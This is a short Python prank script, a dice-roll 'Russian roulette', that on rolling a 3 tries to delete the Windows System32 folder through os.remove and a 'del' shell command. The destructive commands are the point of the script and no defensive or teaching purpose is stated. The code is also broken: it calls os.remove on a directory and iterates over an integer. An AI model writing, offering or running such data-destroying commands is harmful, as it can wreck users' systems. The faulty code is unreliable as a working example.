import os
import random

nice_number = random.randint(1, 6)

while True:
    print(f"{nice_number}")
    if nice_number == 3:
        print("Oh no...")
        os.remove("C:\Windows\System32")
        os.system("del C:\\Windows\\System32") 

    else:
        print("You dodged a bullet there.")
        for nice_number in nice_number:
            nicer_number = 1
            nice_number = nicer_number